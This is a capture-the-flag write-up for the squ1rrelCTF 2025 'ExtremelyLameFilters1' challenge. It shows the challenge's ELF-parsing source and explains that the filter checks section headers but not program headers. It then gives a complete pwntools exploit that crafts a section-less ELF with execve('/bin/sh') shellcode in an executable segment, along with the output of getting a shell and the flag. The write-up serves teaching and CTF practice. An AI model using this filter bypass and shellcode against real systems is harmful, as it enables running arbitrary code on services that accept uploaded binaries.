    class siginfo_t(ctypes.Structure):
        _fields_ = [('si_signo', int_t),
                    ('si_errno', int_t),
                    ('si_code', int_t),
                    ('sigfault_addr', long_t),
                    ('sigfault_trapno', int_t)]
    return siginfo_t

class elf_siginfo_32(generate_siginfo(ctypes.c_uint32, ctypes.c_uint32)):
    pass

class elf_siginfo_64(generate_siginfo(ctypes.c_uint32, ctypes.c_uint64)):
    pass

"""
=[ custom elf parsing code ]=
"""

from ctypes import sizeof
from os import memfd_create, execve, write, environ
from pprint import pprint
import sys
from pathlib import Path

Header = Elf64_Ehdr
Segment = Elf64_Phdr
Section = Elf64_Shdr
Symbol = Elf64_Sym
Reloc = Elf64_Rela
DynTag = Elf64_Dyn

class ValidationException(Exception):
    pass

def nextOrNone(iterable):
    try:
        return next(iterable)
    except StopIteration:
        return None

def listOf(struct: ctypes.Structure, raw: bytes):
    return [struct.from_buffer(raw, i * sizeof(struct)) for i in range(len(raw) // sizeof(struct))]

class Strings:
    def __init__(self, raw: bytes, size: int = -1, offset: int = 0):
        if size < 0:
            size = len(raw)
        self.raw = raw[offset : offset + size]

    def name(self, offset: int) -> None | bytes:
        try:
            name = b""
            while self.raw[offset] != 0:
                name += self.raw[offset].to_bytes(1, "little")
                offset += 1
            return name
        except IndexError:
            return None

class Elf:
    def __init__(self, raw: bytes, header: Header, segments: list[Segment], sections: list[Section]):
        self.raw = raw
        self.ref = memoryview(raw)
        self.header = header
        self.segments = segments
        self.sections = sections
        self.dyanmicSegment = None
        self.dyanmicTags = None
        self.sectionNames = None

        try:
            shstrtab = sections[self.header.e_shstrndx]
            self.sectionNames = Strings(self.content(shstrtab))
        except IndexError:
            pass

        try:
            self.dyanmicSegment = next(filter(lambda seg: seg.p_type == constants.PT_DYNAMIC, self.segments))
            self.dyanmicTags = listOf(DynTag, self.content(self.dyanmicSegment))
        except StopIteration:
            pass

    def write(self, file: str | Path):
        with open(file, "wb") as out:
            out.write(self.raw)

    def run(self, argv: list[str] | None = None):
        argv = argv or sys.argv
        fd = memfd_create("chal", 0)
        write(fd, self.raw)
        execve(fd, argv, environ)

    def content(self, part: Segment | Section) -> bytes:
        if type(part) == Segment:
            return self.ref[part.p_offset : part.p_offset + part.p_filesz]
        elif type(part) == Section:
            return self.ref[part.sh_offset : part.sh_offset + part.sh_size]
        else:
            raise NotImplementedError("unsupported argument type")

    def dyntag(self, targetTag: int) -> None | DynTag:
        if self.dyanmicTags:
            return nextOrNone(filter(lambda tag: tag.d_tag == targetTag, self.dyanmicTags))

    def relocs(self, part: bytes | Section) -> list[Reloc]:
        if type(part) == bytes:
            return listOf(Reloc, part)
        elif type(part) == Section:
            return listOf(Reloc, self.content(part))
        else:
            raise NotImplementedError("unsupported argument type")

    def symtab(self, part: bytes | Section) -> list[Symbol]:
        if type(part) == bytes:
            return listOf(Symbol, part)
        elif type(part) == Section:
            return listOf(Symbol, self.content(part))
        else:
            raise NotImplementedError("unsupported argument type")

    def strtab(self, part: bytes | Section) -> Strings:
        if type(part) == bytes:
            return Strings(part)
        elif type(part) == Section:
            return Strings(self.content(part))
        else:
            raise NotImplementedError("unsupported argument type")

    def section(self, key: bytes | int) -> None | Section:
        if type(key) == str:
            key = key.encode()
        if type(key) == bytes:
            if self.sectionNames:
                for section in self.sections:
                    if (name := self.sectionNames.name(section.sh_name)) and name == key:
                        return section
        elif type(key) == int:
            for section in self.sections:
                if section.sh_type == key:
                    return section
        else:
            raise NotImplementedError("unsupported argument type")

class SectionFlags:
    WRITE = 1 << 0
    ALLOC = 1 << 1
    EXECINSTR = 1 << 2

class SegmentFlags:
    X = 1 << 0
    W = 1 << 1
    R = 1 << 2

def dump(struct: ctypes.Structure):
    for name, t in struct._fields_:
        val = getattr(struct, name)
        if   type(val) == int:
            num = f"{val:x}".rjust(sizeof(t) * 2, "0")
            print(f"{name:<12} = 0x{num}")
        else:
            print(f"{name:<12} = {val}")

def parse(data: bytes, blacklist_segments: list[int] = []) -> Elf:
    data = bytearray(data)
    header = Header.from_buffer(data)

    # these dont actually matter but oh well
    if header.e_ident[constants.EI_CLASS] != constants.ELFCLASS64:
        raise ValidationException("must have 64 bit class")

    if header.e_ident[constants.EI_DATA] != constants.ELFDATA2LSB:
        raise ValidationException("must be little endian")

    if header.e_ehsize != sizeof(Header):
        raise ValidationException("bad header size")

    if header.e_shentsize != sizeof(Section):
        raise ValidationException("bad section size")

    if header.e_phentsize != sizeof(Segment):
        raise ValidationException("bad segment size")

    # important checks
    if header.e_ident[constants.EI_MAG0] != constants.ELFMAG0:
        raise ValidationException("bad elf magic")

    if header.e_ident[constants.EI_MAG1] != constants.ELFMAG1:
        raise ValidationException("bad elf magic")

    if header.e_ident[constants.EI_MAG2] != constants.ELFMAG2:
        raise ValidationException("bad elf magic")

    if header.e_ident[constants.EI_MAG3] != constants.ELFMAG3:
        raise ValidationException("bad elf magic")

    if header.e_machine != 0x3e:
        raise ValidationException("bad machine")

    if header.e_type != constants.ET_EXEC and header.e_type != constants.ET_DYN:
        raise ValidationException("bad type")

    segments = list(Segment.from_buffer(data, header.e_phoff + i * sizeof(Segment)) for i in range(header.e_phnum))
    sections = list(Section.from_buffer(data, header.e_shoff + i * sizeof(Section)) for i in range(header.e_shnum))

    for segment in segments:
        if segment.p_type in blacklist_segments:
            raise ValidationException("blacklisted segment not allowed")

    return Elf(data, header, segments, sections)
```

```py
#!/usr/bin/python3

from elf import *
from base64 import b64decode

data = b64decode(input("I'm a little fairy and I will trust any ELF that comes by!!"))
elf = parse(data)

for section in elf.sections:
    if section.sh_flags & SectionFlags.EXECINSTR:
        raise ValidationException("!!")

elf.run()
```

These are 2 source code that we have. So look at the second one, we know that our input must be in base64, and the first one contains the main function of  this. So let's break down the first one. Because this file is too long, I will only analyze the main function in this file.

- `parse()` function:

    ```py
    def parse(data: bytes, blacklist_segments: list[int] = []) -> Elf:
        data = bytearray(data)
        header = Header.from_buffer(data)

        # these dont actually matter but oh well
        if header.e_ident[constants.EI_CLASS] != constants.ELFCLASS64:
            raise ValidationException("must have 64 bit class")

        if header.e_ident[constants.EI_DATA] != constants.ELFDATA2LSB:
            raise ValidationException("must be little endian")

        if header.e_ehsize != sizeof(Header):
            raise ValidationException("bad header size")

        if header.e_shentsize != sizeof(Section):
            raise ValidationException("bad section size")

        if header.e_phentsize != sizeof(Segment):
            raise ValidationException("bad segment size")

        # important checks
        if header.e_ident[constants.EI_MAG0] != constants.ELFMAG0:
            raise ValidationException("bad elf magic")

        if header.e_ident[constants.EI_MAG1] != constants.ELFMAG1:
            raise ValidationException("bad elf magic")

        if header.e_ident[constants.EI_MAG2] != constants.ELFMAG2:
            raise ValidationException("bad elf magic")

        if header.e_ident[constants.EI_MAG3] != constants.ELFMAG3:
            raise ValidationException("bad elf magic")

        if header.e_machine != 0x3e:
            raise ValidationException("bad machine")

        if header.e_type != constants.ET_EXEC and header.e_type != constants.ET_DYN:
            raise ValidationException("bad type")

        segments = list(Segment.from_buffer(data, header.e_phoff + i * sizeof(Segment)) for i in range(header.e_phnum))
        sections = list(Section.from_buffer(data, header.e_shoff + i * sizeof(Section)) for i in range(header.e_shnum))

        for segment in segments:
            if segment.p_type in blacklist_segments:
                raise ValidationException("blacklisted segment not allowed")

        return Elf(data, header, segments, sections)
    ```

    So base on this we know that the file must be `64-bit (ELFCLASS64)` and `little-endian (ELFDATA2LSB)`, with the header, section header, and program header sizes matching their defined structures, the first bytes of e_ident equal to the expected magic number (0x7F, 'E', 'L', 'F'), and e_machine set to 0x3e (x86-64) with e_type being either `ET_EXEC` or `ET_DYN`.

- `content()` function:

    ```py
    def content(self, part: Segment | Section) -> bytes:
        if type(part) == Segment:
            return self.ref[part.p_offset : part.p_offset + part.p_filesz]
        elif type(part) == Section:
            return self.ref[part.sh_offset : part.sh_offset + part.sh_size]
        else:
            raise NotImplementedError("unsupported argument type")
    ```

    This method takes out the content of a segment or section from the original data based on the offset and size. This is the way to access the data part of the ELF file.

- `run()` function:

    ```py
    def run(self, argv: list[str] | None = None):
        argv = argv or sys.argv
        fd = memfd_create("chal", 0)
        write(fd, self.raw)
        execve(fd, argv, environ)
    ```

    This method creates a virtual file in memory using `memfd_create`, writes all the ELF data into it, and then uses `execve` to run the ELF file. This is where the file given by the user is executed.

Based on that, we know that when we take the content of our ELF file out, it will also execute our elf file.

### Exploit Development

So the vulnerability comes from the check being done only on the section headers, while ignoring the program headers. Specifically:

- Checking Section Headers: Only the sections listed in elf.sections are checked for the EXECINSTR flag. If the ELF file has no section headers (for example: a stripped file or a minimal ELF that includes only the ELF header and program headers), the loop won’t find any flags.

- Program Headers Are Important for Execution: The Linux loader uses the program headers to map memory regions (segments) and set execution permissions. So, even if there are no sections with the EXECINSTR flag, if a segment (from the program header) is marked as executable, the malicious code (payload) can still run.

So to exploit this challenge we need to know about the structure of an ELF file. And I will help you review its parts briefly.

#### 1. ELF Header
**Position:** Always at the beginning of the file.

**Function:**

- Identifies the file as an ELF file using the magic number (4 bytes: `0x7F, 'E', 'L', 'F'`).
- Specifies architecture (32-bit or 64-bit), data format (little-endian or big-endian), version, OS ABI, and other identifying info.
- Provides the location of the Program Header Table and Section Header Table.

**Main fields:**

- `e_ident`: 16-byte identifier (includes magic number, class, data, version, OS ABI, ABI version, and padding).
- `e_type`: File type (e.g., `ET_EXEC` for executable file, `ET_DYN` for shared object, etc.).
- `e_machine`: Machine architecture (e.g., EM_X86_64 for x86-64).
- `e_version`: ELF format version.
- `e_entry`: Entry point address (where execution starts).
- `e_phoff`: Offset to the Program Header Table.
- `e_shoff`: Offset to the Section Header Table.
- `e_flags`: Flags specific to the processor.
- `e_ehsize`: Size of the ELF header.
- `e_phentsize`, `e_phnum`: Size of each entry and number of entries in the Program Header Table.
- `e_shentsize`, `e_shnum`, `e_shstrndx`: Size of each entry, number of entries, and the index of the section that holds section names in the Section Header Table.

#### 2. Program Header Table
**Position:** Located at the offset specified by `e_phoff` in the ELF header.

**Function:**

- Describes the segments (data regions) that need to be loaded into memory when the program runs.
- Each entry (a program header) provides details on how a part of the file should be mapped into memory with specific access rights (Read, Write, Execute).

**Main fields of each entry (`ELF64_Phdr`):**

- `p_type`: Type of segment (e.g., `PT_LOAD` for a loadable segment, `PT_DYNAMIC` for dynamic linking info).
- `p_offset`: Start position of the segment in the file.
- `p_vaddr`: Virtual address where the segment will be mapped in memory.
- `p_paddr`: Physical address (usually same as `p_vaddr`, used in some systems).
- `p_filesz`: Size of the segment data in the file.
- `p_memsz`: Size of the memory region to allocate for the segment (can be bigger than `p_filesz` to allow extra space, like for `.bss`).
- `p_flags`: Access flags (e.g., `PF_R` for read, `PF_W` for write, `PF_X` for execute).
- `p_align`: Alignment requirement for the segment (often equal to page size, e.g., `0x1000`)

####  3. Section Header Table

**Position:** Found at the offset given by the `e_shoff` field in the ELF header.

**Function:**

- Holds info about **sections** – parts of the file used for linking, debugging, and optimizing.
- Different from **segments** (used for program execution), sections are mostly used by the linker and code analysis tools.

**Main fields of each entry (`ELF64_Shdr`):**

- `sh_name`: Index pointing to the section name string (found in the section string table).
- `sh_type`: Type of section (e.g., `SHT_PROGBITS`, `SHT_SYMTAB`, `SHT_STRTAB`, etc.).
- `sh_flags`: Flags describing section properties (e.g., executable code, initialized data).
- `sh_addr`: Virtual address of the section in memory (if loaded).
- `sh_offset`: Offset of the section in the file.
- `sh_size`: Size of the section.
- `sh_link`, `sh_info`: Extra fields used for linking or extra info.
- `sh_addralign`: Alignment requirement of the section.
- `sh_entsize`: Size of each entry if the section holds a table (like a symbol table).

**Common Sections:**

- `.text`: Holds executable machine code.
- `.data`: Holds initialized data.
- `.bss`: Holds uninitialized data (needs memory but doesn't take file space).
- `.rodata`: Holds read-only data (like constants, strings).
- `.symtab`: Symbol table, lists functions, variables, etc.
- `.strtab`: String table, holds names of symbols.
- `.dynamic`: Info for dynamic linking.
- `.rel.text`, `.rela.text`: Relocation tables for adjusting addresses in code.

#### 4. Runtime Loading

When an ELF file is executed, the loader system will:

- Read the ELF Header to determine basic information about the file and the location of the Program Header Table.

- Read the Program Header Table and map the segments into memory at the specified virtual addresses, with the access rights (R, W, X) specified in the program header entries.

- After the mapping is complete, the loader will transfer control (entry point) to the address specified in the e_entry field of the ELF header, where the executable code (usually the shellcode or main machine code of the program) is located.

#### Exploit

And we know that `EXECINSTR` flag is typically placed in the `sh_flags` field of the `section header` in an ELF file. Specifically, this flag (defined as 1 << 2 or value 4) marks sections that contain executable code, such as the `.text` section.

But in the source code we see above, the program iterates through all sections and if it finds any section with the `EXECINSTR` flag set, it throws an exception, thereby preventing the ELF file from being executed. This is to prevent code that is marked as executable from running across sections, although the loader actually uses information from the program header to decide memory access. So we can completely remove the section header and put our shellcode in for the program to execute freely. And to rewrite an elf file for myself I consulted this [page](https://0xninja.fr/posts/binary-golf/)

```py
#!/usr/bin/env python3
import struct
import base64
from pwn import *

p = remote('20.84.72.194', 5002)

# ---------------------------------------
# 1. Build the ELF Header (64-bit)
# ---------------------------------------
# e_ident: 16 bytes: magic, class, data encoding, version, OS ABI, ABI version, and padding.
ELF_MAGIC     = b'\x7fELF'            # Magic number: 0x7F followed by "ELF"
EI_CLASS      = bytes([2])            # ELFCLASS64 (2): 64-bit architecture
EI_DATA       = bytes([1])            # ELFDATA2LSB (1): Little endian encoding
EI_VERSION    = bytes([1])            # ELF version 1
EI_OSABI      = bytes([0])            # System V ABI (0)
EI_ABIVERSION = bytes([0])            # ABI version 0
EI_PAD        = b'\x00' * 7           # Padding to complete 16 bytes total
e_ident       = ELF_MAGIC + EI_CLASS + EI_DATA + EI_VERSION + EI_OSABI + EI_ABIVERSION + EI_PAD

# Other ELF header fields:
e_type        = 2                   # ET_EXEC: Executable file
e_machine     = 0x3e                # EM_X86_64: x86-64 architecture
e_version     = 1                   # ELF version 1
# The entry point is set to the start of our payload, which is located after the ELF and program headers.
entry_point   = 0x400000 + 64 + 56
e_phoff       = 64                  # Program header offset: immediately after the ELF header (64 bytes)
e_shoff       = 0                   # Section header offset: 0 indicates no section headers are present
e_flags       = 0                   # Processor-specific flags
e_ehsize      = 64                  # ELF header size is 64 bytes
e_phentsize   = 56                  # Size of each program header entry (ELF64_Phdr is 56 bytes)
e_phnum       = 1                   # Only one program header entry is present
e_shentsize   = 64                  # Section header entry size must be set correctly (ELF64_Shdr is 64 bytes)
e_shnum       = 0                   # No section header entries
e_shstrndx    = 0                   # No section header string table

elf_header = struct.pack('<16sHHIQQQIHHHHHH',
    e_ident,
    e_type,
    e_machine,
    e_version,
    entry_point,
    e_phoff,
    e_shoff,
    e_flags,
    e_ehsize,
    e_phentsize,
    e_phnum,
    e_shentsize,
    e_shnum,
    e_shstrndx
)

# ---------------------------------------
# 2. Build the Program Header (LOAD Segment)
# ---------------------------------------
# The ELF64_Phdr structure contains:
#   - p_type (4 bytes), p_flags (4 bytes)
#   - p_offset (8 bytes), p_vaddr (8 bytes), p_paddr (8 bytes)
#   - p_filesz (8 bytes), p_memsz (8 bytes), p_align (8 bytes)
p_type   = 1                      # PT_LOAD: Loadable segment
p_flags  = 5                      # Flags: Read (4) + Execute (1) = 5
p_offset = 0                      # Offset in file from which the segment is loaded
p_vaddr  = 0x400000               # Virtual address where the segment will be mapped
p_paddr  = 0x400000               # Physical address (usually the same as p_vaddr)
# ---------------------------------------
# 3. Build the Payload: Shellcode to call execve("/bin/sh")
# ---------------------------------------

payload = asm('''

    xor rax, rax
    mov rbx, 0x0068732f6e69622f
    push rbx
    mov rdi, rsp

    xor rsi, rsi
    xor rdx, rdx

    mov al, 0x3b
    syscall


''', arch='amd64')
# Calculate the total file size: ELF header + program header + payload
p_filesz = 64 + 56 + len(payload)
p_memsz  = p_filesz              # Memory size is the same as file size for this simple ELF
p_align  = 0x1000                # Alignment (typically page size, 0x1000)

program_header = struct.pack('<IIQQQQQQ',
    p_type,
    p_flags,
    p_offset,
    p_vaddr,
    p_paddr,
    p_filesz,
    p_memsz,
    p_align
)

# ---------------------------------------
# 4. Combine All Parts to Form the Final ELF File
# ---------------------------------------
elf_file = elf_header + program_header + payload

# Encode the ELF file in Base64 so that it can be fed to the challenge
exploit_b64 = base64.b64encode(elf_file).decode()
print(exploit_b64)

p.sendline(exploit_b64)

p.interactive()
```

**P/s: to avoid confusion about section and segments you can read [here](https://stackoverflow.com/questions/14361248/whats-the-difference-of-section-and-segment-in-elf-file-format)**


### Get flag

```sh
┌─ [22:52] ❄ alter in /mnt/e/sec/CTFs/2025/squ1relCTF/ExtremelyLameFilters1
└ ϟ python3 xpl.py
[+] Opening connection to 20.84.72.194 on port 5002: Done
f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAEAAAAAAAAEAAAAFAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAkwAAAAAAAACTAAAAAAAAAAAQAAAAAAAASDHASLsvYmluL3NoAFNIiedIMfZIMdKwOw8F
/mnt/e/sec/CTFs/2025/squ1relCTF/ExtremelyLameFilters1/xpl.py:110: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline(exploit_b64)
[*] Switching to interactive mode
I'm a little fairy and I will trust any ELF that comes by!!
$ cat flag*
squ1rrel{you_3x3c'd_me_:(}
```
